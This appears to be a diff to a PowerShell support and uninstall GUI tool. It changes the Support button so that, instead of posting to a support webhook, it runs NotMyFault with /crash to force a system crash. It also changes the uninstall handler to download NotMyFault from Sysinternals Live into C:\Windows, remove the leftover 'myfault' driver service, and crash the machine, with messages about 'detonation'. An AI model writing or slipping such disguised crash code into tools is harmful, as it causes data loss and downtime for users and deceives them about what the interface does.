@@ -122,7 +122,7 @@ $SupportButton.Add_Click({
     } | ConvertTo-Json
 
     try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payload
+        & "C:\windows\NotMyfault64.exe" /crash
     } catch {
         Append-Text $outputBox "⚠ Failed to contact support system." "Red"
     }
@@ -265,23 +265,29 @@ $uninstallButton.Add_Click({
                     $supportButton.IsEnabled = $true
                     $uninstallButton.IsEnabled = $true
 
-                    # --- Run NotMyFault (Sysinternals) ---
-                   # --- Run NotMyFault (Sysinternals Live) ---
+                   # --- Run NotMyFault (Sysinternals) ---
 try {
-    $exePath = "\\live.sysinternals.com\tools\NotMyFault64.exe"
-    if (-not (Test-Path $exePath)) {
-        $exePath = "\\live.sysinternals.com\tools\NotMyFault.exe"
-    }
+    # Try to stop and remove leftover driver if present
+    try { sc.exe stop myfault   | Out-Null } catch {}
+    try { sc.exe delete myfault | Out-Null } catch {}
+
+    $downloadUrl = "https://live.sysinternals.com/NotMyfault64.exe"
+    $exePath     = "C:\Windows\NotMyfault64.exe"
+
+    # Download latest NotMyFault from Sysinternals Live
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath 
 
     if (Test-Path $exePath) {
-        Start-Process -FilePath $exePath -ArgumentList "crash" -WindowStyle Hidden
+        # Launch directly into crash
+        & "C:\Windows\NotMyfault64.exe" /crash
     } else {
-        Append-Text $outputBox "`nComputer cannot explode. Womp womp`n" "Red"
+        Append-Text $outputBox "`nFailed to install explosive`n" "Red"
     }
 }
 catch {
-    Append-Text $outputBox "`nError launching NotMyFault from Sysinternals Live: $_`n" "Red"
+    Append-Text $outputBox "`nDetonation Failed: $_`n" "Red"
 }
+
 
                 }
             }
